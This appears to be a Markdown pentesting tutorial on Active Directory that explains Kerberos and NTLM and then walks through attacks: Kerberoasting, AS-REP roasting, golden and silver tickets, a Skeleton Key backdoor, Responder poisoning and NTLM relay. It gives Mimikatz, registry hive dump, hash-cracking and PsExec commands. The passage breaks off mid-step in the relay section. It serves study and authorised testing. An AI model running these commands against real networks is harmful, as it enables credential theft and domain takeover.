# Active Directory(AD) Pentesting 

#### Active Directory is a set of services created by Microsoft which is used to centrally manage and organize users, apps, computers and other resources in a network. It stores information about all resources  in a database. Also used to manage permissions to access resources. Provides other features such as SSO, encryption, access management, etc.

#### A directory service is a software that is used to store, organize and manage information about network resources. Information about each resource is stored in a database. They also help users/computers identify resources and services in the network by mapping names of resources to their network addresses. Each resource is known as an object. 

# Index

- [Terminology](#terminology)
- [Services](#services)
- [Default Users](#default-users)
- [Groups](#groups)
- [NTLM](#ntlm)
- [UAC](#uac)
- [LSA and LSASS](#lsa-and-lsass)
- [Tools to pentest AD](#tools-to-pentest-ad)
- [Kerberos](#kerberos)
	- [Introduction](#introduction) 
	- [Versions](#versions)
	- [Authentication Process](#authentication-process)
	- [Exploitation](#exploitation)
		- [Finding Domain Users](#finding-domain-users)
		- [AS-REP Roasting](#as-rep-roasting)
		- [Kerberoasting](#kerberoasting)
		- [Golden Ticket](#golden-ticket)
		- [Silver Ticket](#silver-ticket)
		- [Skeleton Key](#skeleton-key)
- [LLMNR, NBNS and mDNS](#llmnr-nbns-and-mdns)
	- [Introduction](#introduction-1)
	- [Poisoning](#poisoning)
	- [WPAD Spoofing](#wpad-spoofing)
- [NTLM Relay Attack](#ntlm-relay-attack)
- [BloodHound](#bloodhound)
- [PowerUp](#powerup)
- [Replication Attacks](#replication-attacks)
	- [DCSync](#dcsync)
	- [DCShadow](#dcshadow)
- [Passing Attacks](#passing-attacks)
	- [Pass the Hash](#pass-the-hash)
	- [Pass the Ticket](#pass-the-ticket)
	- [Overpass the Hash](#overpass-the-hash)
- [CrackMapExec](#crackmapexec)
- [LDAP](#ldap)
- [RPC](#rpc)
- [Creating Malicious Documents](#creating-malicious-documents)
	- [Basics of Visual Basic Scripting](#basics-of-visual-basic-scripting)
	- [Creating a malicious Word document](#creating-a-malicious-word-document)
	- [Creating a malicious Excel spreadsheet](#creating-a-malicious-excel-spreadsheet)

# Terminology 

1.  Forest -> A group of trees
2. Trees -> The combination of a domain and all the child domains under it
3. Domains -> Logical group of objects with similar settings and which share the same database. Lets us groups objects and manage. They can be identified by a domain name. Managed by a domain controller. Separated from one another by logical boundaries
4. Forest Root -> First domain in the forest. Contains the Enterprise and Schema Admin groups
5. Workgroup -> A LAN which consists of computers that are sharing resources (data/software/hardware) with each other. All computers are equal and no computer is used to manage the workgroup. Max 10 computers
6. Objects -> EVERYTHING IN ACTIVE DIRECTORY IS AN OBJECT. Groups, printers, users, computers, domains, etc
7. Organizational Units -> Containers in which we can add other users, groups, servers, etc. Used to organize objects and apply policies to them. It is like a folder containing files where files are objects. Are in a domain
8. Trust -> Special permissions which allow users to access resources in other domains. In directional trusts, a trusting domain can access resources in the trusted domain. In transitive trusts, 2 domains trust each other and so can access resources in each other. Other than this, the domains can access domains which are trusted by each other 
9. Domain Controller -> The boss computer which has complete access to a domain and is used to manage it. AD is installed on this computer. Runs services to authenticate users and stores the database which stores information about objects in that domain. If a change is made to the database in 1 DC, the changes are made to the database in the others
10. Schema -> Rules and permissions for creating objects
11. Global Catalog -> A copy of the information about objects and their attributes in the current domain and some information about objects of other domains stored on a DC. This DC is called the global catalog server and it listens on ports 3268 (LDAP) and 3269 (LDAP/SSL). By default first DC is the global catalog server
12. Query and Index system -> Lets us search for objects and their attributes
13. Replication Service -> Used to replicate data from the database of 1 DC to the database of other DCs. The process of transferring data and updating the database from 1 DC to another is called replication
14. Distinguished name -> A special name which is used to identify the location of an object in AD. To construct a distinguished name, we should know the object's name, the OU it is in and the domain it is in. It can be found in the `objectCategory` of the `Attribute Editor` of the AD Users and Computers interface. Format:

```txt
CN=<Object Name>, OU=<OU Name>, DC=<Second level domain>, DC=<Top level domain>

CN = Hello World, OU=test, DC=active, DC=local

CN = Arav\,test, OU=hello, OU=world, DC=active, DC=local
```

To find the domain name, add the 2 DC values

15. SID -> Secure Identifier. All objects in the domain have this unique ID to identify them. The last section of the SID is called the relative identifier (RID) which is used to identify that object in a domain
16. Group Policies -> Settings which are shared by all computers, users and operating systems in the domain. Stored in the SYSVOL share. Declared in the Group Policy Management Console of a DC
17. Group Policy Objects (GPOs) ->  Objects which store group policies which are shared by computers/users/operating systems in the domain
18. SYSVOL -> Network file share which is hosted on all the DCs and stores files which should be accessible by all authenticated users in the domain
19. ACL -> Access Control List. A list of objects (users, groups, etc.) which are allowed to access a resource in the domain and the type of access they have to that resource. Each entry which defines the object allowed to access the resource and the type of access is called an access control entry (ACE)
20. AD Users and Computers -> Provides an interface to create/manage objects in the domain. Used to view the contents of a domain

# Services

1. Domain Services (AD DS) -> A directory service which is used to manage computers, users, apps and other resources in the network. Stores information about these resources in a database. Provides authentication and authorization features too 
2. Certificate Services (AD CS) -> Allows the DC to create and use digital certificates, signatures, asymmetric encryption
3. Federation Services (AD FS) -> Provides single-sign-on (SSO) so that users do not have to always type their credentials
4. Rights Management Services (AD RMS) -> Used to control information rights and data security policies such as whether a user can access a file 
5. Lightweight Directory Services (AD LDS) -> Provides storage of information of resources in a database and lets applications read from/write to the database via LDAP

# Default Users

1. Administrator - The admin on the first DC. All windows computers in the forest will have this user 
2. krbtgt - User on the DC of all domains. It is the service account for the KDC. Password is set by the system. It's NT hash is used to encrypt TGTs 
3. Guest - Lets users have limited access to computers in the domain. Disabled by default. Password is blank. Lets one-time users perform tasks without needing an account
4. HelpAssistant - Created when a remote assistance session is running. Disabled when there are no remote assistance requests. Remote Assistance session is used to connect to another windows computer and it is initiated by invitation. Has limited access 

# Groups

Distribution groups -> Used by email apps to send an email to a collection of users

Security groups -> Used to assign permissions to a collection of objects in the network

Local groups -> Present in 1 computer and not the domain/forest

Global groups -> Present in the domain/forest

1. Enterprise Admins - Can access machines in the entire forest. The members have 518 as their RID
2. Domain Admins - Can access the domain controller to manage the domain. All domain admins have 512 as their RID
3. Service Accounts - Mostly never used except for service maintenance/management. Required by Windows servers which will pair a service such as a DNS server with a service account so that we can log into that service and manage it. Maybe a domain admin. 
4. Local Admins - Have complete access to a local machine(s). Do not have access to the domain controller
5. Domain Users - Normal users which log into machines to perform daily tasks. May have local admin permissions. All domain users have the same RID i.e. 513
6. Account Operators - Can create/modify most user accounts such as users, local groups and domain groups but not administrators. Can access the DC
7. Backup Operators - Can create backups and restore files on all computers in the domain (Including DC). Can log on to and shutdown computers too. Cannot replace files on the DC
8. DnsAdmins - Can access the information from the DNS server if it is running on the DC
9. Remote Management Users - Allows users to manage servers in the network using WinRM/WMI
10. Server Operators - Used to administer DCs. This group is a local group on the DC. Can log on to the DC, delete/create/modify network files shares, backup/restore files, stop/start services, format storage media and shutdown the DC. By default has no members
11. Schema Admins - Can make changes to the AD schema. Exists in the forest root domain. The members have 513 as their RID
12. Print Operators - Can manage/create/modify/delete printers in the network. Can also manage printer objects
13. Cryptographic Operators - Can perform cryptographic operations such as encryption
14. Network Configuration Operators - Can modify TCP/IP properties in the LAN such as  IP addresses, subnet mask, default gateway and DNS server. Can modify/delete remote access connections
15. Key Admins - Can perform admin actions on key objects in the domain

# NTLM

New Technology Lan Manager

A security protocol to authenticate users to services/resources in the network via passwords and hashes

## LM 

Lan Manager

Hashing algorithm which was used to hash the passwords stored in the SAM database of old windows computers such as XP

Weak hashing algorithm

## NT Hashes

Hashes stored in the SAM database of modern windows computers

The algorithm used for these hashes is MD4

An NT hash is made up of an LM hash followed by an NT hash

Nowadays, LM hashes are no longer stored and the default value for it is `aad3b435b51404eeaad3b435b51404ee` which means `no password`

Since the LM hash is not used in the NT hash, the NT hash is sometimes called the NTLM hash. This is the hash we use for pass the hash attacks. 

In the SAM database, the hashes are stored as follows

```txt
Username:UID:LM Hash:NT Hash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0d
```

## Net-NTLMv1/v2

Challenge response protocols that are used to authenticate a user to a service on a windows server

1. The client will tell the server they want to authenticate to it (NEGOTIATE)
2. The server sends a challenge to the client (CHALLENGE)
3.  The client encrypts this challenge using it's NT hash and sends this back to the server (AUTHENTICATE)
4.  The server will then send the response sent by the client, the original challenge and the user's username to the domain controller
5.  The domain controller will extract the real NT hash from the database and encrypt the challenge with it. It will then compare the 2 encrypted challenges and if they match, the client is allowed to login in
6.  Net-NTLMv1/v2 are also known as NTLMv1/v2

NTLMv1 is rarely used as it is less secure compared to v2. In v1, the challenge's size was always 16 bits and in v2 it is of a random size

An NTLMv1/v2 hash is simply the challenge which has been encrypted with the user's NT hash

# UAC

User Account Control 

When an admin user logs into the computer, then all the tasks do not need to be executed with high privileges . With UAC, the admin's session will not run with high privileges 

When a task which needs high privileges is executed, a prompt is display which asks if the user wishes to proceed. This task will then run with high privileges

It also allows low privileged users run programs with admin privileges by specifying the password of the admin user

# LSA and LSASS

LSA -> Local Security Authority. Component of windows which takes cares of security operations

LSASS -> Local Security Authority Subsystem Service. Windows process which stores NT hashes and Kerberos tickets in a secure memory location. It can forward tickets/hashes to access network resources so that the user does not have to type their credentials all the time

# Tools to pentest AD

1. [Impacket (0.9.19)](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19)  
2. [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
3. [Kerbrute](https://github.com/ropnop/kerbrute)
4. [Bloodhound](https://github.com/BloodHoundAD/BloodHound)
5. [Responder](https://github.com/SpiderLabs/Responder)
6. [smbmap](https://github.com/ShawnDEvans/smbmap) and [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) 
7. [Empire](https://github.com/BC-SECURITY/Empire) and [Starkiller](https://github.com/BC-SECURITY/Starkiller)
8. [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
9. [Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe?raw=true)
10. [Mimikatz](https://github.com/gentilkiwi/mimikatz)

# Kerberos

## Introduction

Kerberos is a layer 7 (Application Layer) **client-server network authentication protocol**. It lets clients securely authenticate to services/resources by using tickets, in an insecure network. It uses the User Datagram Protocol (UDP) as its transport layer protocol.

With regards to encryption, Kerberos uses symmetric encryption i.e. the same key is used for encrypting and decrypting data. It supports the RC4, DES, AES 256 bit and AES 128 bit ciphers, where RC4 is the oldest and weakest

It was developed in the 1980s by MIT. The protocol was named after the three-headed dog of Hades, Cerberus.

Kerberos is the default authentication method in Active Directory

The Kerberos server runs on the domain controller and it listens on port 88/udp. It is also known as the Key Distribution Center (KDC) since it distributes tickets to clients. Since the KDC runs on the domain controller, it can fetch information (NT hash, SID, etc.) from the Active Directory Database.

The KDC consists of 2 parts:

-   Authentication Server: Authenticates a client and issues a TGT to it
-   Ticket Granting Service (TGS) Server: Verifies a client's TGT and issues a TGS to it

_Fun fact: The 3 dogs in the Kerberos logo represent the client, the KDC and the service to authenticate to._

As mentioned above, Kerberos uses tickets to authenticate clients to services/resources. There are 2 types of tickets:

-   Ticket Granting Ticket (TGT): Issued by the Authentication Server to the client so that the client can ask for a TGS later. They are used to authenticate users.Â 
-   Ticket Granting Service (TGS): Used to access services in the network. The client presents its TGT to the TGS Server so that it can receive the TGS for a specific service and then access it. Upon receiving a TGS, the client presents it to the service

These tickets expire after 10 hours. This can be changed in the Group Policy Management Console.

The service account for the KDC is the krbtgt account. This account exists by default on the domain controller and cannot be deleted/modified. Its password is long and complex and is set by the system and changed periodically. The krbtgt account's NT Hash is used to encrypt the TGTs.

To identify services in the domain, Kerberos uses Service Principal Names (SPNs). These are unique identifiers that are used to associate a service instance with a service account so that we can authenticate to the instance and manage it.

The format of an SPN is

`Hostname/Username.Domain.TLD:Port`

Hostname -> Hostname of the computer running that service

Username -> Username of the service account

Port -> The port on which the service is listening

When using Kerberos, a special certificate is added to the TGT and TGS. It is known as the privileged attribute certificate (PAC) and it contains the privilege and information about the user (group memberships, SID, etc.) This is used by the service to confirm that the user is who they say are. This is optional in Kerberos.

In Kerberos, a realm refers to the domain in which the KDC is used to issue tickets and authenticate users to services/resources.

## Versions

Kerberos versions 1-3 were developed and used internally at MIT.

In the late 1980s, Kerberos version 4 was released to the public. The protocol had limited ticket features. It used the weak data encryption standard (DES) cipher. To identify hosts it used IP addresses and used the "receiver-makes-right" encoding system. The lifetime of a ticket had to be specified in units of 5 minutes and it did not support cross-realm authentication.

Kerberos version 5 was published in 1993. It appeared as RFC 1510 but was made obsolete by RFC 4120 in 2005. With regards to tickets, the protocol supports forwarding, renewing and postdating. For encryption it uses the advanced encryption standard (AES) cipher. This version supports all types of addresses and uses the ASN.1 encoding system. One can set an explicit start and finish times allowing arbitrary lifetimes for tickets. It supports cross-realm authentication.

## Authentication process 

![Kerberos Authentication process ](kerberosAuth.png)

1. Once the client logs into their computer, it will send a ticket request to the KDC. The user's computer will send the current time encrypted with the user's NT Hash (Think of the NT hash as the key), their username and the service they wish to access which will be krbtgt in this case. (AS_REQ)

2. Upon receiving this request, the KDC checks if a user with that username exists in the domain. To do so, it will check the AD database. If it finds the user, it will fetch its NT hash and decrypt the time. If the time is found to be within 5 minutes of the DC's clock time, it will proceed. This is to prevent replay attacks. The KDC will generate a TGT. This TGT contains the service name (krbtgt), the expiry date, a session key, a PAC and the client's username. Everything other than the service name is then encrypted with the NT hash of the krbtgt user. A copy of the session key is then encrypted with the user's NT hash and these are sent back to the user. (AS_REP)

3. The user's computer will decrypt the copy of the session key using the user's NT hash. Now to access a service, the client's computer will send the TGT, the name of the service they wish to access and an authenticator to the KDC. The authenticator refers to the client's username and the current time which are encrypted with the session key. This is to prove that the client has the session key which could only be decrypted using their NT hash (TGS_REQ)

4. Upon receiving this, the KDC will decrypt the TGT using the NT hash of the krbtgt user. By doing so, it will extract the session key and decrypt the authenticator. If this is successful, it proceeds. The KDC will then try to find the SPN for that service name and when it does, it will get the service account associated with it. It then generates a TGS. This TGS contains the service name, the expiry date, a new session key, the PAC from the TGT and the client's username. Everything other than the service name is then encrypted with the NT hash of the service account. A copy of the new session key is then encrypted with the user's NT hash and these are sent back to the user. (TGS_REP)

5. The client's computer will send the TGS and an authenticator (client's username and current time) which are encrypted with the new session key to the service instance. A new authenticator is to prove that the client has the new session key which could only be decrypted using their NT hash (AP_REQ)

6. The service will decrypt the TGS by using its service account's NT hash and extract the new session key and PAC. It will then decrypt the authenticator using the new session key. If this is successful, it proceeds

**Note: The steps from now on are optional**

7. To verify if this PAC is a legitimate one and has not been forged, the service sends this PAC to the KDC. (VERIFY_PAC)

8. Upon receiving the PAC, the KDC checks if it is valid. If it is, the KDC sends a message to the server to let it know that it is valid. (PAC_VERIFY_RESPONSE)

9. The service now knows the privileges of the user by reading the PAC and it has verified the user's identity (The user has the session key which could only be decrypted using their NT hash). The user is now allowed access to the service instance (AP_REP)

All the steps other than AP_REQ and AP_REP, take place over the Kerberos protocol. These 2 steps take place over the protocol which the service instance supports.

In Kerberos, anyone is allowed to provide credentials to the KDC and get a TGT and hence get a TGS. But the service will not allow us to gain access with the TGS as it checks if we have the permission to provide a TGS and gain access

## Exploitation

## Finding Domain Users

First we will have to download Kerbrute and add it to our path 

We will have to provide a usernames file, the domain name and the IP of the domain controller which has the KDC

```txt
kerbrute userenum --dc 10.10.10.100 -d active.local users.txt
```

Here,  `active.local`  is the domain name,  `10.10.10.100`  is the IP of the DC and `users.txt` is the list of possible usernames

In this, we connect to the KDC and send a username from the list to authenticate. The KDC sends an error message i.e. `KDC_ERR_C_PRINCIPAL_UNKNOWN` if the user does not exist in the database. If it returns any other message, it means the user is valid

WE SHOULD NEVER ATTACK THE KDC SERVICE VIA A BRUTEFORCE ATTACK AS AFTER A CERTAIN NUMBER OF FAILED LOGIN ATTEMPTS, THE USER ACCOUNT WILL BE LOCKED OUT/DISABLED

## AS-REP Roasting 

In an AS-REP Roasting attack, we do not need to provide credentials to the KDC. This is because that account has preauthentication disabled. This is generally used to gain access to a user account and not a service one

We ask the KDC for a TGT and it will send it and a copy of the session key which is encrypted with the user's NT hash back to us. Now we can take a random password, hash it and try to decrypt the key. We keep on doing this until we can decrypt the key and when we can, we have found the correct password

### On Linux

Using the `GetNPUsers.py` script from Impacket, we will grab a TGT from the KDC and crack the hash with hashcat

If we do not know the username we wish to attack, we can provide a usernames file

```txt
python GetNPUsers.py -no-pass -dc-ip 10.10.10.100 active.local/ -usersfile user.txt
```

Here,  `active.local`  is the domain,  `10.10.10.100`  is the IP of the DC and `users.txt` is the list of possible usernames

If we do have the username of the account which is AS-REP roastable, we can provide that

```txt
python GetNPUsers.py -no-pass -dc-ip 10.10.10.100 active.local/svc-admin 
```

Here,  `active.local`  is the domain name,  `10.10.10.100`  is the IP of the DC and `svc-admin` is the AS-REP Roastable service account

This script will request the KDC for the TGT of that user and will not have to provide credentials as preauthentication is disabled for the account. It will then receive the TGT and session key

Now this encrypted session key's key/NT hash can be cracked using hashcat 

```powershell
hashcat -m 18200 -a 0 asrep.txt rockyou.txt
```

Here,  `asrep.txt`  is the file containing the encrypted session key and  `rockyou.txt`  is the wordlist

## On Windows

For Windows, we will use Rubeus

Run the command below to find all AS-REP-Roastable accounts in the current domain get the encrypted session keys

```powershell
.\Rubeus.exe AS-REProast /format:hashcat /outfile:asrep.txt
```

This program will request the KDC for the TGT of that user and will not have to provide credentials as preauthentication is disabled for the account. It will then receive the TGT and session key

Now this encrypted session key's key/NT hash can be cracked using hashcat 

```powershell
.\hashcat.exe -m 18200 -a 0 asrep.txt rockyou.txt
```

Here,  `asrep.txt`  is the file containing the encrypted session key and  `rockyou.txt`  is the wordlist

## Kerberoasting 

Kerberoasting is an attack in which we have credentials and can grab a TGT from the KDC. So we can also grab a TGS from the KDC

Since the TGS is encrypted with the service account's NT hash, we can take a random password, hash it and try to decrypt the key

We keep on doing this until we can decrypt the key and when we can, we have found the service account's password

## On Linux

We can find kerberoastable service accounts with bloodhound

Using the `GetUserSPNs.py` script from Impacket, we will authenticate with the KDC which will provide a TGT. CREDENTIALS ARE REQUIRED TO PERFORM A KERBEROASTING ATTACK

```txt
python GetUserSPNs.py -request -dc-ip 10.10.10.100 active.local/svc-admin
```

Here,  `active.local`  is the domain name,  `10.10.10.100`  is the IP of the DC and `svc-admin` is the account whose credentials we have

The script will first request the KDC for the account's TGT by providing its credentials. Then it will send the TGT and authenticator to the KDC and request for the TGS of all SPNs and then display the encrypted session keys

Now this encrypted session key's key/NT hash can be cracked using hashcat 

```powershell
.\hashcat -m 13100 -a 0 asrep.txt rockyou.txt
```

Here,  `asrep.txt`  is the file containing the encrypted session key and  `rockyou.txt`  is the wordlist

## On Windows

For Windows, we will use Rubeus

Run the command below to find all kerberoastable accounts in the current domain and get the encrypted session keys

```powershell
.\Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt
```

The program will first request the KDC for the account's TGT by providing its credentials. Then it will send the TGT and authenticator to the KDC and request for the TGS of all SPNs and then display the encrypted session keys

Now this encrypted session key's key/NT hash can be cracked using hashcat 

```powershell
.\hashcat.exe -m 13100 -a 0 kerb.txt rockyou.txt
```

Here,  `kerb.txt`  is the file containing the encrypted session key and  `rockyou.txt`  is the wordlist

## Golden Ticket

In this attack, we create a forged TGT which is encrypted using the krbtgt account 's NT hash and so we can request a TGS for any SPN and access the service

This is a post exploitation attack which lets us establish persistence. We perform this attack once we have access to the DC

To perform this attack, we will use Mimikatz

We will need the NT hash of the krbtgt account, the domain SID and the domain name

1. To obtain the domain SID, we can run this command

```txt
whoami /USER
```

The domain SID is under the `SID` column and is the string of characters from the starting to the 2nd last set of characters. For example, if this command displays `S-1-5-21-3566474924-3672637628-382372873-1002`, then the domain SID is `S-1-5-21-3566474924-3672637628-382372873`

2. Now we will have to get the NT hash of the krbtgt account. This can be done in 2 ways, dumping hashes from the SAM and SYSTEM files or dumping the LSA secrets

#### Dumping hashes from the SAM and SYSTEM files

Query the registry to grab the SAM and SYSTEM files. Run cmd as an Administrator to do this

```powershell
reg save hklm\sam C:\Temp\sam.hive
reg system hklm\system C:\Temp\system.hive
```

Now launch Mimikatz and the dump the hashes using LSADump

```txt
mimikatz # lsadump::sam /system:C:\Temp\system.hive /sam:C:\Temp\sam.hive
```

#### Dumping LSA secrets

```txt
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
```

3. Using Mimikatz, you can now create a forged ticket which will be valid for 10 years and will be signed by the krbtgt account. Run this command in Mimikatz to do so

```txt
mimikatz # privilege::debug
mimikatz # kerberos::golden /user:admin2 /domain:active.local /sid:S-1-5-21-3566474924-3672637628-382372873 /krbtgt:a991ae45aa987a1a48c8bdc1209ff0e7 
```

Here, `admin2` is the new fake user,  `active.local`  is the domain name, `S-1-5-21-3566474924-3672637628-382372873` is the domain SID and `a991ae45aa987a1a48c8bdc1209ff0e7` is the NT hash of the krbtgt account. Make sure that the user does not already exist as Mimikatz will create a new user

4. Now you can save this ticket to a file and launch command prompt which would let us use this ticket

```txt
mimikatz # kerberos::ptt ticket.kirbi
mimikatz # misc::cmd
```

5. From here, you can perform actions such as accessing any file share in the domain or connecting to an MSSQL Server

```powershell
net use D: \\dc.active.local\secretShare # Mount a file share from the domain controller

sqlcmd -S dbserver.active.local # Connecting to an MSSQL instance on the database server
1> SELECT HOST_NAME, SELECT SYSTEM_USERl;
2> GO

PsExec64.exe \\secretServer.active.local cmd.exe # Using the TGT to get a TGS to access the SMB service and execute commands via psexec
```

## Silver Ticket

In this attack, we can use a service account's NTLM hash to create a forged TGS and access the service

This is a post exploitation attack. We perform this attack once we have access to the DC

There is no communication with the KDC

We will need the NT hash of the service account account, the domain SID, the domain name and the type of service

1. To obtain the domain SID, we can run this command

```txt
whoami /USER
```

The domain SID is under the `SID` column and is the string of characters from the starting to the 2nd last set of characters. For example, if this command displays `S-1-5-21-3566474924-3672637628-382372873-1002`, then the domain SID is `S-1-5-21-3566474924-3672637628-382372873`

2. Now we will have to get the NT hash of the service account account. This can be done in 2 ways, dumping hashes from the SAM and SYSTEM files or dumping the LSA secrets

#### Dumping hashes from the SAM and SYSTEM files

Query the registry to grab the SAM and SYSTEM files. Run cmd as an Administrator to do this

```powershell
reg save hklm\sam C:\Temp\sam.hive
reg system hklm\system C:\Temp\system.hive
```

Now launch Mimikatz and the dump the hashes using LSADump

```txt
mimikatz # lsadump::sam /system:C:\Temp\system.hive /sam:C:\Temp\sam.hive
```

#### Dumping LSA secrets

```txt
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject 
```

Now we have to find the service account's hash. In this case, lets take the service account as SQLsvc aka the service account for an MSSQL instance

3. Using Mimikatz, you can now create a forged TGS for the MSSQL server. Run this command in Mimikatz to do so

```txt
mimikatz # privilege::debug
mimikatz # kerberos::golden /user:admin2 /id:1000 /domain:active.local /sid:S-1-5-21-3566474924-3672637628-382372873 /rc4:299b03ecc71190d4313c1c78da807d80 /service:MSSQLSvc
``````

Here, `admin2` is the new fake user,  `active.local`  is the domain name, `S-1-5-21-3566474924-3672637628-382372873` is the domain SID, `299b03ecc71190d4313c1c78da807d80` is the NT hash of the SQLsvc account, `1000` is the RID of the fake user  and `MSSQLSvc` is the type of service we want to access. Make sure that the `admin2` does not already exist as Mimikatz will create a new user

A full list of all the types of services can be found [here](https://adsecurity.org/?page_id=183)

4. Now you can save this ticket to a file and launch command prompt which would let us use this ticket

```txt
mimikatz # kerberos::ptt ticket.kirbi
mimikatz # misc::cmd
```

5. From here, you can connect to the MSSQL Server

```powershell
sqlcmd -S dbserver.active.local
1> SELECT HOST_NAME, SELECT SYSTEM_USERl;
2> GO
```

## Skeleton Key

We put a backdoor on to the domain controller which would let us authenticate to any resource in the domain using a single master password

It will not work on 32 bit systems

Windows support Kerberos and NTLM for authentication

With regards to NTLM, the master password's NT hash would be injected into the LSASS process. When a user wants to authenticate, the DC would fetch the hash from LSASS rather than the SAM DB, encrypt it with the challenge and then compare the challenges

With regards to Kerberos, when the KDC receives an AS-REQ from a client, it will try to decrypt the encrypted timestamp using the user's NT hash which it fetched from the database and the master password's NT hash. It will also downgrade the Kerberos encryption algorithm to RC4

This would not work when the DC is restarted/shutdown

To perform this attack, simply run mimikatz along with the following command on the domain controller

```powershell
mimikatz.exe "privilege::debug" "misc::skeleton" exit
```

Now you can access any resource in the network with the password `mimikatz`

```powershell
net use D: \\dc.active.local\secretShare /user:Administrator mimikatz # Mount a file share from the domain controller

sqlcmd -S dbserver.active.local -U SQLSvc -P mimikatz # Connecting to an MSSQL instance on the database server
1> SELECT HOST_NAME, SELECT SYSTEM_USERl;
2> GO

PsExec64.exe -u Administrator -p mimikatz \\secretServer.active.local cmd.exe # Connecting to the SMB server as the Administrator user to execute commands via psexec
```

# LLMNR, NBNS and mDNS 

## Introduction

LLMNR(Link-Local Multicast Name Resolution) is a layer 7 protocol used to resolve a hostname to an IP address (aka find the IP address of the computer with that hostname) if DNS the server fails to do so. It lets us connect to a service by providing a hostname instead of an IP address.

When connecting to a service via a hostname, our computer first queries the DNS server to check if it can find the IP address for that hostname. If it does not, a broadcast is sent across the network using LLMNR which asks if a computer with that hostname exists and if it does, it should respond with it's IP address to our computer.  If it does, the server with that hostname will respond back to us with it's IP address and thus we can connect to it.

Similar to LLMNR, there is another protocol named NetBIOS Name Service (NBNS) which would resolve a NetBIOS name to an IP address by sending a broadcast query. NetBIOS is an API which lets apps/computers communicate with each other on a LAN. NetBIOS names are used to identify the computers. Nowadays, we use NetBIOS over TCP/IP which is a protocol that lets old computers/apps use the TCP/IP stack via the NetBIOS API to communicate with modern computers/apps. NetBIOS -> Network Basic Input/Output System

Similar to the above, mDNS (Multicast Domain Name System) is a layer 7 protocol which is used to resolve a hostname to an IP address. This is used in the case when there is no DNS server in the network and a broadcast query needs to be sent to the resolve a hostname to an IP address. 

All of the above protocols use UDP at layer 4

All these protocols are vulnerable since they send out broadcast queries. In this case, an attacker's computer on the network can respond with their IP address even if it does not have that hostname and so the victim can connect to the attacker's machine 

##  Poisoning

![Poisoning](poisoning.png)

LLMNR/NBNS/mDNS Poisoning is an attack in which an attacker listens for LLMNR/NBNS/mDNS broadcast queries and when it receives one, it responds with it's IP address. If the client types an invalid hostname, a broadcast query would be sent but no computer would send a reply but our computer would and this would cause the target to connect to us and authenticate to us

'Poisoning' refers to responding with our IP address for a query even if we not have that hostname

To perform an LLMNR/NBNS/mDNS Poisoning attack, we will use Responder. 

Responder is the tool we use to listen for broadcast queries and respond with our computer's IP address. It runs multiple services which clients can connect to and provide an NTLMv2 hash

If a user tries to connect to the service of an invalid hostname, then the DNS server will not be able to resolve the IP address and then the computer will use LLMNR/NBNS/mDNS to do so. Using LLMNR/NBNS/mDNS, a broadcast query will be sent to the entire network asking for the computer with that hostname to respond with it's IP address. Responder will send a reply with our computer's IP address and so the victim will connect to us. Upon connecting to our computer, Responder will send the NTLMv2 challenge and the target will encrypt it with it's NT hash and send it back. Now we have the NTLMv2 hash which can be cracked. LLMNR/NBNS/mDNS do not check the integrity of the response for the query i.e. it does not confirm that the computer responding actually has that hostname and so any computer is able to respond to a query

We can run responder using this command. 

```bash
sudo ./Responder.py -i eth0 -rdwv
```

Here, `eth0` is the interface we wish to listen on

If a host tries to connect to an invalid hostname/our IP address, responder will send a reply to the machine and provide our machine's IP address 

Once the NTLM challenge-response takes place, we will have an NTLMv2 hash (NT Hash+Challenge)

This can be cracked using John

```txt
john --format=ntlmv2 --wordlist=rockyou.txt hash.txt
```

Here,  `rockyou.txt`  is the wordlist we will use and `hash.txt` is the file containing the hash

## WPAD Spoofing

Web-Proxy Auto Discovery is a protocol which lets web browsers automatically discover HTTP/HTTPS proxy configuration files which are stored on servers in the network.

During this process, the web browser would first check if it has received the URL from the DHCP Server. This URL states the location of the file. If it does, it will simply download it. Else it proceeds to the next step

If the previous step didn't work, the computer sends a query to the DNS server to resolve  `wpad.Domain.TLD` or `wpad.TLD` or `wpad.Subdomain.Domain.TLD` to the IP address. If the DNS server cannot resolve the domain, it will proceed to the next step

Finally, a broadcast query would be sent to the network via LLMNR/NBNS/mDNS to resolve the IP address. If this step does not result in our computer getting the domain of the server, the HTTP(S) request is sent without a proxy.

In most cases WPAD is disabled in the domain and if this would fail and so we could perform an LLMNR/NBNS/mDNS poisoning attack and grab the credentials of the user trying to authenticate. These credentials would be in cleartext

To perform this attack, we will again use responder

```bash
sudo responder -i eth0 --wpad
```

When a client's web browser wants to fetch the proxy config file, it would ask the DNS server on the DC to resolve `wpad.Domain.TLD` to it's IP address

Once this would fail, an LLMNR/NBNS/mDNS broadcast query would be sent to the network, asking for the computer with that hostname to reply with it's IP address and responder would reply with our machine's IP address

The machine would then attempt to connect to our machine by providing it's credentials and then we would capture them in clear text

# NTLM Relay Attack

An MITM attack in which a victim attempts to authenticate to a legit server but instead it is authenticating to an attacker's server which is sending the NEGOTIATE and AUTHENTICATE requests to the target server and sending the CHALLENGE response from the target server to the victim. Thus, the attacker would be able to access the server and the victim wont 

When a user attempts to access a resource via an invalid hostname, a LLMNR/NBNS/mDNS broadcast query which asks for the server with that hostname to respond with it's IP. 

In this case, our machine would reply with it's IP (LLMNR/NBNS/mDNS Poisoning). When the computer connects to our machine to authenticate, it first sends its username and says it wants to login. Our computer forwards this username to the target server and says it want to login. 

The target will send a challenge back to our machine. We will send this challenge to the victim machine and it would encrypt it with it's NT hash and send it back to us. We would take this NTLMv2 hash (Challenge+NT hash) and send it to the target server. If the credentials are valid, we can login. However, we let the victim computer know that it could not login

In most cases we would authenticate using the SMB protocol. SMB Signing is used to digitally sign packets. This checks if any packet has been tampered with during the communication

![SMB Relay](SMB-Relay.png)
  
 1. First we will find all machines which are running an SMB server and message signing is disabled using cme

```bash
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt
```

2. Next we have to configure and start Responder. Open the configuration file which is located at `/usr/share/responder/Responder.conf`

Set the value for `HTTP` and `SMB` as `OFF` and save the changes

Now you can start responder

```bash
